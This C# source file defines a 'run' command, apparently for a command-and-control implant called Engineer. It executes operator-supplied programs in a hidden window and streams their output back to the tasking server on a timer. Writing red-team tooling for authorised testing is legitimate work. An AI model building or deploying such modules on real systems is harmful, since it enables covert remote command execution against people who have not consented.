using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class Run : EngineerCommand
    {
        public override string Name => "run";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                
                task.Arguments.TryGetValue("/command", out string command);
                task.Arguments.TryGetValue("/args", out string argument);
                task.Arguments.TryGetValue("/timeout", out string timeout);

                command = command.Trim();
                argument = argument.Trim();

                //Console.WriteLine($"starting program {command}");
                //Console.WriteLine($"sending it arguments {argument}");

                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        WorkingDirectory = Directory.GetCurrentDirectory(),
                        FileName = command,
                        Arguments = argument,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    }
                };

                //Console.WriteLine("Starting process");
                process.Start();

                var output = new StringBuilder();
                var error = new StringBuilder();
                string line;

                var outputResetEvent = new ManualResetEvent(false);
                var errorResetEvent = new ManualResetEvent(false);

                int lineTimeout = Timeout.Infinite; // No timeout by default but can be passed in
                if(!String.IsNullOrEmpty(timeout))
                {
                    int.TryParse(timeout,out int timeout_result);
                    lineTimeout = timeout_result * 1000; //seconds to milliseconds 
                }

                Thread outputThread = new Thread(() =>
                {
                    while (!task.cancelToken.IsCancellationRequested &&(line = process.StandardOutput.ReadLine()) != null)
                    {
                        output.AppendLine(line);
                        outputResetEvent.Set(); // Signal that a line has been read
                    }
                });

                Thread errorThread = new Thread(() =>
                {
                    while (!task.cancelToken.IsCancellationRequested && (line = process.StandardError.ReadLine()) != null)
                    {
                        error.AppendLine(line);
                        errorResetEvent.Set(); // Signal that a line has been read
                    }
                });

                outputThread.Start();
                errorThread.Start();

                int lastSentPosition = 0;
                var timer = new Timer(_ =>
                {
                    lock (output)
                    {
                        if (output.Length > lastSentPosition)
                        {
                            string newContent = output.ToString(lastSentPosition, output.Length - lastSentPosition);
                            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(newContent, task, EngTaskStatus.Running, TaskResponseType.String);
                            lastSentPosition = output.Length;
                        }
                    }
                }, null, TimeSpan.FromSeconds(10), TimeSpan.FromSeconds(10));

                if (task.cancelToken.IsCancellationRequested)
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("[-]Task Cancelled", task, EngTaskStatus.Cancelled, TaskResponseType.String);
                    outputThread.Abort();
                    errorThread.Abort();
                    process.Kill(); // Terminate the underlying process
                }

                while (!outputThread.Join(lineTimeout) || !errorThread.Join(lineTimeout))
                {
                    if (task.cancelToken.IsCancellationRequested)
                    {
                        outputThread.Abort();
                        errorThread.Abort();

                        // Send the partial output
                        lock (output)
                        {
                            if (output.Length > lastSentPosition)
                            {
                                string newContent = output.ToString(lastSentPosition, output.Length - lastSentPosition);
                                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(newContent, task, EngTaskStatus.Running, TaskResponseType.String);
                            }
                        }

                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("[-]Task Cancelled", task, EngTaskStatus.Cancelled, TaskResponseType.String);
                        break;
                    }
                    if (outputResetEvent.WaitOne(0) || errorResetEvent.WaitOne(0))
                    {
                        outputResetEvent.Reset();
                        errorResetEvent.Reset();
                        continue;
                    }

                    break;
                }

                timer.Dispose();
                if (process.HasExited == false)
                {
                    process.Kill();
                }
                if (error.Length > 0)
                {
                    output.AppendLine("Error:");
                    output.AppendLine(error.ToString());
                }

                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(output.ToString(), task, EngTaskStatus.Complete, TaskResponseType.String);
            }
            catch (Exception ex)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(ex.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
            }
        }
    }
}
